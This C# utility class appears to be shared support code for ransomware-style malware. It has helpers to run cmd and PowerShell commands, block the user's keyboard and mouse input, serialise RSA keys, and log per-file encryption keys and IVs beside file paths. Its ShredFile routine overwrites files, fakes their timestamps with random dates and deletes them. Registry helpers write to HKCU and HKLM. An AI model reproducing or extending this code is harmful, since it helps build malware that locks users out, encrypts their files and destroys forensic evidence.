using Microsoft.Win32;
using System.Diagnostics;
using System.Xml.Serialization;
using System.Management.Automation;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace Shared
{
    public class Utility
    {
        public const string CMD_PATH = @"C:\Windows\System32\cmd.exe";
        
        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        
        private static extern bool InputManager([MarshalAs(UnmanagedType.Bool)] bool block);

        public static string KeyToString(RSAParameters key)
        {            
            StringWriter sw = new();
            XmlSerializer xs = new(typeof(RSAParameters));
            
            xs.Serialize(sw, key);
            return sw.ToString();
        }

        public static RSAParameters StringToKey(string key)
        {
            StringReader sr = new(key);
            XmlSerializer xs = new(typeof(RSAParameters));
            
            return (RSAParameters)xs.Deserialize(sr);
        }

        public static string? RunCMDCommand(string command)
        {
            try
            {
                Process process = new();
                ProcessStartInfo startInfo = new()
                {
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    FileName = CMD_PATH,
                    Arguments = $"/c {command}"
                };

                process.StartInfo = startInfo;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                return output;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return null;
            }
        }

        public async static Task<List<string>?> RunPowershellCommand(string script, Dictionary<string, object>? parameters = null, string? member = null)
        {
            if (string.IsNullOrEmpty(script))
                return null;

            try
            {
                List<string> output = new();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.AddScript(script);
                    if (parameters != null)
                        ps.AddParameters(parameters);

                    ICollection<PSObject> result = await ps.InvokeAsync().ConfigureAwait(false);
                    foreach (PSObject item in result)
                    {
                        if (member != null)
                        {
                            PSMemberInfo? possibleOutput = item.Members[member];
                            if (possibleOutput != null)
                            {
                                string? val = possibleOutput.Value.ToString();
                                if (val != null)
                                    output.Add(val);
                            }
                        }
                        else
                        {
                            string? data = item.ToString();
                            if (data != null)
                                output.Add(data);
                        }
                    }
                }
                
                return output;
            }
            catch (Exception) { return null; }
        }
        
        public static string GetRandomPath(string dir, string? extension = null)
        {
            string guid;
            do
            {
                guid = Guid.NewGuid().ToString();
            } while (File.Exists(Path.Combine(dir, guid)));

            if (string.IsNullOrEmpty(extension) || string.IsNullOrWhiteSpace(extension))
                return Path.Combine(dir, guid);

            return Path.Combine(dir, guid + extension);
        }

        public static void BlockInput(bool shouldBlock)
        {
            InputManager(shouldBlock);
        }

        public static void WriteDictToFile(string filePath, List<string> keys, List<string> ivs, string[] paths)
        {
            if (string.IsNullOrEmpty(filePath) || keys == null || ivs == null || paths == null || paths == null)
                return;

            using StreamWriter? sw = new(filePath);
            int min = Math.Min(keys.Count, Math.Min(ivs.Count, paths.Length));

            for (int i = 0; i < min; i++)
            {
                sw.WriteLine($"{keys[i]} {ivs[i]}\t{paths[i]}");
            }
        }

        public static void ShredFile(string? path, int timesToOverwrite = 5)
        {
            try
            {
                if (!string.IsNullOrEmpty(path) && !string.IsNullOrWhiteSpace(path) && File.Exists(path))
                {
                    File.SetAttributes(path, FileAttributes.Normal);
                    double sectors = Math.Ceiling(new FileInfo(path).Length / 512.0);
                    byte[] randomBuffer = new byte[512];

                    FileStream? inputStream = new(path, FileMode.Open);
                    if (inputStream == null)
                        return;

                    for (int currentPass = 0; currentPass < timesToOverwrite; currentPass++)
                    {
                        inputStream.Position = 0;
                        for (int sectorsWritten = 0; sectorsWritten < sectors; sectorsWritten++)
                        {
                            RandomNumberGenerator.Fill(randomBuffer);
                            inputStream.Write(randomBuffer, 0, randomBuffer.Length);
                        }
                    }

                    inputStream.SetLength(0);
                    inputStream.Close();

                    Random r = new();
                    DateTime dt = new(r.Next(2000, 2024), r.Next(1, 12), r.Next(1, 28), r.Next(1, 12), r.Next(1, 60), r.Next(1, 60));

                    File.SetCreationTime(path, dt);
                    File.SetLastAccessTime(path, dt);
                    File.SetLastWriteTime(path, dt);
                    File.SetCreationTimeUtc(path, dt);
                    File.SetLastAccessTimeUtc(path, dt);
                    File.SetLastWriteTimeUtc(path, dt);

                    File.Delete(path);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static bool DoesRegExists(int hive, string path, string name)
        {
            RegistryKey? reg = GetRegistry(hive, path);
            if (reg == null)
                return false;

            object? regValue = reg.GetValue(name);
            if (regValue == null)
                return false;

            return true;
        }

        public static bool DoesRegExists(int hive, string path, string name, object value)
        {
            RegistryKey? reg = GetRegistry(hive, path);
            if (reg == null)
                return false;

            object? regValue = reg.GetValue(name);
            if (regValue == null)
                return false;

            return regValue == value;
        }

        public static void CreateRegister(int hive, string path, string name)
        {
            CreateRegister(hive, path, name, null);
        }

        public static void CreateRegister(int hive, string path, string name, object? value)
        {
            try
            {
                ModifyRegister(hive, path, name, value);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void ModifyRegister(int hive, string path, string name, object? value)
        {
            try
            {
                RegistryKey? key = GetRegistry(hive, path);
                if (key == null)
                    return;

                if (value == null)
                    key.SetValue(name, "");
                else
                    key.SetValue(name, value);

                key.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void DeleteRegister(int hive, string path, string name)
        {
            try
            {
                RegistryKey? key = GetRegistry(hive, path);
                if (key == null)
                    return;

                key.DeleteValue(name);
                key.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        private static RegistryKey? GetRegistry(int hive, string path)
        {
            if (hive == 0)
                return Registry.CurrentUser.OpenSubKey(path, true);
            else if (hive == 1)
                return Registry.LocalMachine.OpenSubKey(path, true);
            else
                return null;
        }
    }
}